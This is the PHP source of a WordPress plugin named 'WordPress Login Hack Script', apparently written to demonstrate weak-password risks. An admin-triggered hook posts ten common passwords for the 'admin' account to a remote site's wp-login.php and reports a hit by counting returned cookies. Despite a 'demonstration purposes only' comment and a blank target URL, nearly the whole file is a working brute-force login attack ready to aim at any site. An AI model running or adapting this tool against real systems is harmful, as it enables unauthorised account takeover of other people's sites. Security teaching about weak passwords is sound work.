<?php
/*
Plugin Name: WordPress Login Hack Script
Plugin URI: http://schoolpress.me/wordpress-login-hack-script/
Description: Tries 10 common passwords on a remote WordPress site.
Version: 1.0
Author: Stranger Studios
Author URI: http://www.strangerstudios.com
*/
/*
  THIS PLUGIN IS FOR DEMONSTRATION PURPOSES ONLY

	Test passwords on a remote WordPress site.
	Step 1. Set $url and $login vars below.
	Step 2. Visit http://yoursite.com/?loginhack=1 as an admin.
*/
function login_hack_init()
{
	//keep out non-admins and check for loginhack request string
	if(empty($_REQUEST['loginhack']) || !current_user_can('manage_options'))
		return;
	
	//url and login
	$url = '';  //e.g. http://targetsite.com/wp-login.php
	$login = 'admin';
	
	//10 common passwords
	$passwords = array(
		'password',		
		'123456',
		'12345678',
		'abc123',
		'qwerty',
		'monkey',
		'letmein',
		'dragon',
		'111111',
		'baseball'
	);
	
	foreach($passwords as $password)
	{
		echo "<hr />Trying " . $password . " ...";
		
		//prevent time outs
		set_time_limit(30);

		//try login over POST
		$result = wp_remote_post(
			$url, 
			array(
				'method' => 'POST',
				'body'=> array('log'=>$login, 'pwd'=>$password)
			)
		);			
		
		//check if it worked (extra cookies will be made)
		if(count($result['cookies']) > 2)
		{
			echo "<strong>Winner!</strong>";
			exit;
		}
		else
			echo "Failed.";
	}

	exit;
}
add_action("init", "login_hack_init");
?>
